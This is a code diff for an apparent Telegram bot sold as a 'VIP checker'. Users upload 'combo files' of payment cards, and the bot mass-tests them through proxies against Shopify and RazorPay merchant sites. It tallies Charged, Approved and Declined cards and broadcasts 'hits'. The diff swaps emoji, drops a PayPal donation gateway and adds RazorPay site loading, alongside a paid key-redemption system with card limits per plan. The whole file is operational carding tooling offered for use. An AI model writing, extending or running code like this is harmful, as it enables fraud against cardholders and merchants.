-├ <b>{sf('Plan')}:</b> <code>{sf(t)}</code>
-├ <b>{CE_TIME} {sf('Duration')}:</b> <code>{sf(str(d))} {sf('Days')}</code>
+├ <b>{CE_SMILE} {sf('User')}:</b> <a href="tg://user?id={uid}">{safe_name}</a>
+├ <b>{CE_DIAMOND} {sf('Plan')}:</b> <code>{sf(t)}</code>
+├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(d))} {sf('Days')}</code>
 ├ <b>{CE_GEAR} {sf('Mass Limit')}:</b> <code>{sf(str(limit))} CCs</code>
-╰ <b>{CE_TIME} {sf('Expires On')}:</b> <code>{sf(ed)}</code>"""
+╰ <b>{CE_CHART} {sf('Expires On')}:</b> <code>{sf(ed)}</code>"""
         await styled_reply(update, msg, use_gif=True, specific_gif=REDEEM_GIF)
         
         try:
-            an = f"<b>{CE_STAR} {sf('New Key Redeemed!')}</b>\n\n├ <b>{sf('Key')}:</b> <code>{sf(c)}</code>\n├ <b>{CE_STAR} {sf('User')}:</b> <a href='tg://user?id={uid}'>{safe_name}</a> (<code>{sf(str(uid))}</code>)\n├ <b>{sf('Plan')}:</b> <code>{sf(t)}</code>\n├ <b>{CE_TIME} {sf('Duration')}:</b> <code>{sf(str(d))} {sf('Days')}</code>\n╰ <b>{CE_TIME} {sf('Time')}:</b> <code>{sf(rt)}</code>"
+            an = f"<b>{CE_PARTY} {sf('New Key Redeemed!')}</b>\n\n├ <b>{sf('Key')}:</b> <code>{sf(c)}</code>\n├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={uid}'>{safe_name}</a> (<code>{sf(str(uid))}</code>)\n├ <b>{CE_DIAMOND} {sf('Plan')}:</b> <code>{sf(t)}</code>\n├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(d))} {sf('Days')}</code>\n╰ <b>{CE_CHART} {sf('Time')}:</b> <code>{sf(rt)}</code>"
             if ADMIN_ID:
                 for admin in ADMIN_ID:
                     await styled_send(context.bot, admin, an, use_gif=True, specific_gif=REDEEM_GIF)
-        except Exception as e:
-            logger.error(f"Failed to notify admin: {e}")
+        except Exception: pass
 
     elif cmd == "validate":
         if uid not in ADMIN_ID: return
         raw_c = args[0].strip() if args else ""
         c = unsf(raw_c)
         kdb = await load_keys()
-        if not c: return await styled_reply(update, f"<b>{CE_FIRE} {sf('Syntax')}:</b> <code>/validate [Key]</code>", use_gif=True)
-        if c not in kdb: return await styled_reply(update, f"<b>{CE_FIRE} {sf('Key not found in database.')}</b>", use_gif=True)
+        if not c: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Syntax')}:</b> <code>/validate [Key]</code>", use_gif=True)
+        if c not in kdb: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Key not found in database.')}</b>", use_gif=True)
         ki = kdb[c]
         u, ub = ki.get("used", False), ki.get("used_by", "None")
         se, st = ('🔴', "Used") if u else ('🟢', "Active")
-        m = f"<b>{CE_STAR} {sf('Key Information')}</b>\n\n├ <b>{sf('Key')}:</b> <code>{sf(c)}</code>\n├ <b>{CE_FIRE} {sf('Status')}:</b> <code>{sf(st)}</code>\n├ <b>{sf('Plan Tier')}:</b> <code>{sf(ki.get('tier', 'Unknown'))}</code>\n├ <b>{CE_TIME} {sf('Duration')}:</b> <code>{sf(str(ki.get('days', 0)))} {sf('Days')}</code>\n╰ <b>{CE_TIME} {sf('Generated')}:</b> <code>{sf(ki.get('generated_at', 'Unknown'))}</code>"
+        m = f"<b>{CE_DIAMOND} {sf('Key Information')}</b>\n\n├ <b>{sf('Key')}:</b> <code>{sf(c)}</code>\n├ <b>{CE_SMILE} {sf('Status')}:</b> <code>{sf(st)}</code>\n├ <b>{sf('Plan Tier')}:</b> <code>{sf(ki.get('tier', 'Unknown'))}</code>\n├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(ki.get('days', 0)))} {sf('Days')}</code>\n╰ <b>{CE_CHART} {sf('Generated')}:</b> <code>{sf(ki.get('generated_at', 'Unknown'))}</code>"
         if u: 
             prof_name = escape_html(sf(_USER_NAMES.get(ub, f"User {ub}")))
-            m += f"\n\n├ <b>{CE_STAR} {sf('Redeemed By')}:</b> <code>{sf(str(ub))}</code> <a href='tg://user?id={ub}'>[{prof_name}]</a>\n╰ <b>{CE_TIME} {sf('Redeem Time')}:</b> <code>{sf(ki.get('redeemed_at', 'Not yet'))}</code>"
+            m += f"\n\n├ <b>{CE_SMILE} {sf('Redeemed By')}:</b> <code>{sf(str(ub))}</code> <a href='tg://user?id={ub}'>[{prof_name}]</a>\n╰ <b>{CE_CHART} {sf('Redeem Time')}:</b> <code>{sf(ki.get('redeemed_at', 'Not yet'))}</code>"
         await styled_reply(update, m, use_gif=True)
 
     elif cmd == "maint":
@@ -989,16 +866,16 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 un = escape_html(sf(_USER_NAMES.get(u, f"User {u}")))
                 gate = p.get("gate", "Unknown")
                 total = p.get("total", "?")
-                active_info.append(f"  ├ <b>{CE_STAR} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a> (<code>{sf(str(u))}</code>)\n  │  ╰ Gate: <code>{sf(gate)}</code> | CCs: <code>{sf(str(total))}</code>")
+                active_info.append(f"  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a> (<code>{sf(str(u))}</code>)\n  │  ╰ Gate: <code>{sf(gate)}</code> | CCs: <code>{sf(str(total))}</code>")
                 
         recent_users_info = []
         sorted_users = sorted(USER_LAST_REQ.items(), key=lambda x: x[1], reverse=True)[:15] 
         for u, _ in sorted_users:
             un = escape_html(sf(_USER_NAMES.get(u, f"User {u}")))
-            recent_users_info.append(f"  │  ├ <b>{CE_STAR} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a>\n  │  ╰ ID: <code>{sf(str(u))}</code>")
+            recent_users_info.append(f"  │  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a>\n  │  ╰ ID: <code>{sf(str(u))}</code>")
             
         text = f"<b>{CE_GEAR} {sf('Global System Status')}</b>\n\n├ <b>{sf('Total Session Users')}:</b> <code>{sf(str(len(USER_LAST_REQ)))}</code>\n"
-        if recent_users_info: text += f"  │  ├ <b>{CE_STAR} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a>\n  │  ╰ ID: <code>{sf(str(u))}</code>\n"
+        if recent_users_info: text += f"  │  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a>\n  │  ╰ ID: <code>{sf(str(u))}</code>\n"
         else: text += f"  ╰ {sf('Recent Users')}: <code>{sf('None')}</code>\n\n"
             
         text += f"├ <b>{sf('Active Checkers')}:</b> <code>{sf(str(len(active_info)))}</code>\n"
@@ -1009,18 +886,18 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif cmd == "revoke":
         if uid not in ADMIN_ID: return
-        if not args: return await styled_reply(update, f"<b>{CE_FIRE} {sf('Please provide a valid ID.')}</b>", use_gif=True)
+        if not args: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide a valid ID.')}</b>", use_gif=True)
         try: tu = int(unsf(args[0].strip()))
-        except Exception: return await styled_reply(update, f"<b>{CE_FIRE} {sf('Please provide a valid ID.')}</b>", use_gif=True)
+        except Exception: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide a valid ID.')}</b>", use_gif=True)
         await set_user_plan(tu, "Free", 0)
         proc = ACTIVE_MTXT_PROCESSES.get(tu)
         if proc:
             proc["stopped"] = True
             for t in proc.get("tasks", []):
                 if not t.done(): t.cancel()
-        admin_msg = f"<b>{CE_FIRE} {sf('Access Revoked')}</b>\n├ <b>{CE_STAR} {sf('User')}:</b> <code>{sf(str(tu))}</code>\n╰ <b>{sf('Status')}:</b> <code>{sf('Demoted to Free')}</code>"
+        admin_msg = f"<b>{CE_BOOM} {sf('Access Revoked')}</b>\n├ <b>{CE_SMILE} {sf('User')}:</b> <code>{sf(str(tu))}</code>\n╰ <b>{sf('Status')}:</b> <code>{sf('Demoted to Free')}</code>"
         await styled_reply(update, admin_msg, use_gif=True)
-        try: await styled_send(context.bot, tu, f"<b>{CE_FIRE} {sf('System Alert')}</b>\n\n╰ {sf('Your VIP access has been revoked by the administrator.')}", use_gif=True)
+        try: await styled_send(context.bot, tu, f"<b>{CE_BOOM} {sf('System Alert')}</b>\n\n╰ {sf('Your VIP access has been revoked by the administrator.')}", use_gif=True)
         except Exception: pass
 
 # ====================== CALLBACK FUNCTIONS ======================
@@ -1030,11 +907,11 @@ async def plans_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = q.from_user.id
     if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await q.answer("Maintenance Break!", show_alert=True)
     cp = await get_user_plan(uid)
-    t = f"<b>{CE_STAR} {sf('VIP Subscription Plans')}</b>\n\n"
+    t = f"<b>{CE_CROWN} {sf('VIP Subscription Plans')}</b>\n\n"
     for _, pi in PLANS.items():
-        t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_TIME} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} CCs</code>\n│ ╰ <b>{CE_STAR} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
+        t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} CCs</code>\n│ ╰ <b>{CE_CASH} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
     t += f"╰ <b>{sf('Your Current Plan')}:</b> <code>{sf(cp.title()) if cp else sf('Bronze')}</code>"
-    kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt", style="primary")], [InlineKeyboardButton(sf("Back"), callback_data="back_start", style="danger")]]
+    kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt")], [InlineKeyboardButton(sf("Back"), callback_data="back_start")]]
     await styled_edit(q.message, t, buttons=kb)
     await q.answer()
 
@@ -1046,34 +923,29 @@ async def back_start_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     plan = await get_user_plan(uid)
     limit = get_cc_limit(plan, uid)
     
-    admin_panel = f"\n\n<b>{CE_GEAR} {sf('Admin Panel')}:</b>\n ├ /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ /validate {sf('[key]')} - {sf('Check Key')}\n ├ /users - {sf('System Status')}\n ╰ /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
+    admin_panel = f"\n\n<b>{CE_GLASSES} {sf('Admin Panel')}:</b>\n ├ {CE_CANDLE} /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ {CE_CANDLE} /validate {sf('[key]')} - {sf('Check Key')}\n ├ {CE_CANDLE} /users - {sf('System Status')}\n ╰ {CE_CANDLE} /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
     
-    t = f"""<b>━━━ {CE_STAR} {sf('SHOPIFY VIP CHECKER')} {CE_STAR} ━━━</b>
+    t = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM')} {CE_CROWN} ━━━</b>
 
-<b>{CE_ROCKET} {sf('Checker Engine')}:</b>
+<b>{CE_TOP} {sf('Checker Engine')}:</b>
  ╰ <i>{sf('Send a combo file to auto-start mass check')}</i>
 
 <b>{CE_GEAR} {sf('Proxy Manager')}:</b>
- ├ /addpxy - {sf('Add Proxies')}
- ├ /proxy - {sf('View Proxies')}
- ╰ /rmpxy - {sf('Remove Proxies')}
+ ├ {CE_CANDLE} /addpxy - {sf('Add Proxies')}
+ ├ {CE_CANDLE} /proxy - {sf('View Proxies')}
+ ╰ {CE_CANDLE} /rmpxy - {sf('Remove Proxies')}
 
-<b>{CE_STAR} {sf('Account Settings')}:</b>
- ├ /info - {sf('Profile Info')}
- ├ /redeem - {sf('Redeem Key')}
- ├ /fb - {sf('Send Feedback')}
- ╰ /plan - {sf('View Subscriptions')}{admin_panel}
+<b>{CE_DIAMOND} {sf('Account Settings')}:</b>
+ ├ {CE_CANDLE} /info - {sf('Profile Info')}
+ ├ {CE_CANDLE} /redeem - {sf('Redeem Key')}
+ ├ {CE_CANDLE} /fb - {sf('Send Feedback')}
+ ╰ {CE_CANDLE} /plan - {sf('View Subscriptions')}{admin_panel}
 
-<b>👤 {sf('Your Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Free')} ({sf(str(limit))} {sf('CC Limit')})</code>"""
+<b>{CE_SMILE} {sf('Your Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Free')} ({sf(str(limit))} {sf('CC Limit')})</code>"""
     
-    kb = [[InlineKeyboardButton(sf("View Plans"), callback_data="show_plans", style="primary")]]
-    
-    if is_valid_url(JOIN_CHANNEL_LINK) and is_valid_url(JOIN_GROUP_LINK):
-        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary"), InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
-    elif is_valid_url(JOIN_CHANNEL_LINK):
-        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary")])
-    elif is_valid_url(JOIN_GROUP_LINK):
-        kb.append([InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
+    kb = [[InlineKeyboardButton(sf("View Plans"), callback_data="show_plans")]]
+    if is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK)])
+    if is_valid_url(JOIN_GROUP_LINK): kb[-1].append(InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK))
         
     await styled_edit(q.message, t, buttons=kb)
     await q.answer()
@@ -1108,23 +980,25 @@ async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYP
     q = update.callback_query
     uid = q.from_user.id
     gn = q.data.split(":")[1]
-    if gn.startswith("soon_"): return await q.answer("⏳ Gateway is coming soon!", show_alert=True)
     await q.answer()
     msg_obj = q.message
     if gn == "cancel":
         PENDING_FILES.pop(uid, None)
-        return await styled_edit(msg_obj, f"<b>{CE_FIRE} {sf('Process Cancelled.')}</b>", buttons=None)
+        return await styled_edit(msg_obj, f"<b>{CE_CLOWN} {sf('Process Cancelled.')}</b>", buttons=None)
     cards = PENDING_FILES.pop(uid, None)
     if not cards: return await q.answer("⚠️ Session expired.", show_alert=True)
     ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": [], "total": len(cards), "gate": gn}
-    await styled_edit(msg_obj, f"<b>{CE_GEAR} {sf('Preparing Session...')}</b>\n\n├ <b>{sf('Loaded')}:</b> <code>{sf(str(len(cards)))} CCs</code>\n├ <b>{CE_GEAR} {sf('Threads')}:</b> <code>{sf(str(WORKERS))}</code>\n╰ <b>{CE_ROCKET} {sf('Gateway')}:</b> <code>{sf(gn)}</code>", buttons=None)
+    await styled_edit(msg_obj, f"<b>{CE_GEAR} {sf('Preparing Session...')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Loaded')}:</b> <code>{sf(str(len(cards)))} CCs</code>\n├ <b>{CE_GEAR} {sf('Threads')}:</b> <code>{sf(str(WORKERS))}</code>\n╰ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gn)}</code>", buttons=None)
     asyncio.create_task(_run_mass_process(update, msg_obj, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gn, context.bot))
 
 async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
     uid = update.effective_user.id
     tot = len(cards); chk = chg = app = ins = dec = err = 0
     st = time.time()
-    sites = await get_github_sites()
+    
+    if gate_name == "RazorPay": sites = await get_razor_sites()
+    else: sites = await get_shopify_sites()
+        
     proxies = [p['proxy_url'] for p in await get_all_user_proxies(uid)] if await get_all_user_proxies(uid) else []
     http_session = await get_user_http_session(uid)
     
@@ -1143,17 +1017,17 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
             cpm = int((chk / elapsed_now) * 60) if elapsed_now > 0 else 0
             h_now, m_now, s_now = elapsed_now // 3600, (elapsed_now % 3600) // 60, elapsed_now % 60
             
-            dt = f"<b>━━━ {CE_GEAR} {sf('CHECKING IN PROGRESS')} {CE_GEAR} ━━━</b>\n\n├ <b>{CE_ROCKET} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>\n├ <b>{CE_FIRE} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_TIME} {sf('Time')}:</b> <code>{sf(f'{h_now}h {m_now}m {s_now}s')}</code>"
+            dt = f"<b>━━━ {CE_GEAR} {sf('CHECKING IN PROGRESS')} {CE_GEAR} ━━━</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>\n├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Time')}:</b> <code>{sf(f'{h_now}h {m_now}m {s_now}s')}</code>"
             
             percent = int((chk / tot) * 100) if tot > 0 else 0
             
             kb = [
-                [InlineKeyboardButton(sf(f"📄 {chk}/{tot} ({percent}%)"), callback_data="none", style="success" if percent == 100 else "primary")],
-                [InlineKeyboardButton(sf(f"⇌ Charged: {chg}"), callback_data="none", style="success"), InlineKeyboardButton(sf(f"✅ Approved: {app}"), callback_data="none", style="success")],
-                [InlineKeyboardButton(sf(f"● Insuff: {ins}"), callback_data="none", style="success"), InlineKeyboardButton(sf(f"✖ Declined: {dec}"), callback_data="none", style="danger")],
-                [InlineKeyboardButton(sf(f"❗ Errors: {err}"), callback_data="none", style="danger")],
-                [InlineKeyboardButton(sf(f"🚀 Speed: {cpm} CPM"), callback_data="none", style="primary")],
-                [InlineKeyboardButton(sf("🛑 Stop Process"), callback_data=f"{stop_prefix}:{uid}", style="danger")]
+                [InlineKeyboardButton(sf(f"📄 {chk}/{tot} ({percent}%)"), callback_data="none")],
+                [InlineKeyboardButton(sf(f"⇌ Charged: {chg}"), callback_data="none"), InlineKeyboardButton(sf(f"✅ Approved: {app}"), callback_data="none")],
+                [InlineKeyboardButton(sf(f"● Insuff: {ins}"), callback_data="none"), InlineKeyboardButton(sf(f"✖ Declined: {dec}"), callback_data="none")],
+                [InlineKeyboardButton(sf(f"❗ Errors: {err}"), callback_data="none")],
+                [InlineKeyboardButton(sf(f"🚀 Speed: {cpm} CPM"), callback_data="none")],
+                [InlineKeyboardButton(sf("🛑 Stop Process"), callback_data=f"{stop_prefix}:{uid}")]
             ]
             try: await styled_edit(msg_obj, dt, buttons=kb)
             except asyncio.CancelledError: break
@@ -1163,8 +1037,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     queue = asyncio.Queue()
     for c in cards: queue.put_nowait(c)
 
-    concurrency_limit = 1 if gate_name == "PayPal" else WORKERS
-    sem = asyncio.Semaphore(concurrency_limit)
+    sem = asyncio.Semaphore(WORKERS)
 
     async def worker(wid):
         await asyncio.sleep(wid * 0.1)
@@ -1176,13 +1049,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
             async with sem:
                 try:
                     c_st = time.time()
-                    
-                    if gate_name == "PayPal":
-                        p = random.choice(proxies) if proxies else None
-                        res = await check_paypal_donate_api(card, p)
-                    else:
-                        res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, max_retries=2)
-                    
+                    res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, max_retries=2)
                     if is_stopped(): break 
                     
                     c_el = time.time() - c_st
@@ -1191,33 +1058,24 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                     
                     raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
                     short_msg = (raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg
-                    
                     last_resp = sf(short_msg)
                     
                     if status == 'Charged':
                         chg += 1
                         asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot))
                         asyncio.create_task(_send_global_hit(gateway=gate_name, price=res.get('price', '-'), uid=uid, bot=bot, elapsed=c_el))
-                    elif status == 'Approved':
-                        app += 1
-                    elif status == 'Insufficient':
-                        ins += 1
-                    elif status == 'Site Error': 
-                        err += 1
-                    else: 
-                        dec += 1
+                    elif status == 'Approved': app += 1
+                    elif status == 'Insufficient': ins += 1
+                    elif status == 'Site Error': err += 1
+                    else: dec += 1
                         
                 except asyncio.CancelledError: break
                 except Exception: err += 1; chk += 1
                 finally:
                     queue.task_done()
-                    if not is_stopped():
-                        if gate_name == "PayPal":
-                            await asyncio.sleep(random.uniform(5.0, 8.5))
-                        else:
-                            await asyncio.sleep(DELAY)
+                    if not is_stopped(): await asyncio.sleep(DELAY)
 
-    wt = [asyncio.create_task(worker(i)) for i in range(concurrency_limit)]
+    wt = [asyncio.create_task(worker(i)) for i in range(WORKERS)]
     process_store[uid]["tasks"] = wt + [ut]
     await asyncio.gather(*wt, return_exceptions=True)
     if not ut.done(): ut.cancel()
@@ -1226,14 +1084,14 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     h, m, s = el // 3600, (el % 3600) // 60, el % 60
     avg_cpm = int((chk / el) * 60) if el > 0 else 0
     
-    ft = f"<b>{CE_STAR} {sf('DONE')}</b>\n\n├ <b>{CE_ROCKET} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(concurrency_limit))}</code>\n├ <b>{CE_FIRE} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_TIME} {sf('Total Time')}:</b> <code>{sf(f'{h}h {m}m {s}s')}</code>"
+    ft = f"<b>{CE_CROWN} {sf('DONE')} {CE_PARTY}</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>\n├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Total Time')}:</b> <code>{sf(f'{h}h {m}m {s}s')}</code>"
     
     fkb = [
-        [InlineKeyboardButton(sf(f"📄 {chk}/{tot} (100%)"), callback_data="none", style="success")],
-        [InlineKeyboardButton(sf(f"⇌ Charged: {chg}"), callback_data="none", style="success"), InlineKeyboardButton(sf(f"✅ Approved: {app}"), callback_data="none", style="success")],
-        [InlineKeyboardButton(sf(f"● Insuff: {ins}"), callback_data="none", style="success"), InlineKeyboardButton(sf(f"✖ Declined: {dec}"), callback_data="none", style="danger")],
-        [InlineKeyboardButton(sf(f"❗ Errors: {err}"), callback_data="none", style="danger")],
-        [InlineKeyboardButton(sf(f"🚀 Average Speed: {avg_cpm} CPM"), callback_data="none", style="primary")]
+        [InlineKeyboardButton(sf(f"📄 {chk}/{tot} (100%)"), callback_data="none")],
+        [InlineKeyboardButton(sf(f"⇌ Charged: {chg}"), callback_data="none"), InlineKeyboardButton(sf(f"✅ Approved: {app}"), callback_data="none")],
+        [InlineKeyboardButton(sf(f"● Insuff: {ins}"), callback_data="none"), InlineKeyboardButton(sf(f"✖ Declined: {dec}"), callback_data="none")],
+        [InlineKeyboardButton(sf(f"❗ Errors: {err}"), callback_data="none")],
+        [InlineKeyboardButton(sf(f"🚀 Average Speed: {avg_cpm} CPM"), callback_data="none")]
     ]
     try: await styled_edit(msg_obj, ft, buttons=fkb)
     except Exception: pass
@@ -1255,7 +1113,8 @@ async def empty_callback_handler(update: Update, context: ContextTypes.DEFAULT_T
 
 async def check_sites_loop():
     while True:
-        await get_github_sites()
+        await get_shopify_sites()
+        await get_razor_sites()
         await asyncio.sleep(600)
 
 async def post_init(app: Application):
@@ -1271,7 +1130,6 @@ def main():
     app.add_error_handler(global_error_handler)
     
     app.add_handler(MessageHandler(filters.ALL, master_router))
-    
     app.add_handler(CallbackQueryHandler(gateway_selection_cb, pattern=r"^gate:"))
     app.add_handler(CallbackQueryHandler(stop_chk_cb, pattern=r"^stop_chk:"))
     app.add_handler(CallbackQueryHandler(plans_cb, pattern=r"^show_plans$"))
@@ -1279,7 +1137,7 @@ def main():
     app.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
     app.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))
     
-    logger.info("✅ VIP BOT IS FULLY OPERATIONAL WITH ASYNC STRICT PAYPAL 1$ & CHARGED FONT!")
+    logger.info("✅ VIP BOT IS FULLY OPERATIONAL WITH FORCED GIFS & RAZORPAY!")
     
     while True:
         try:
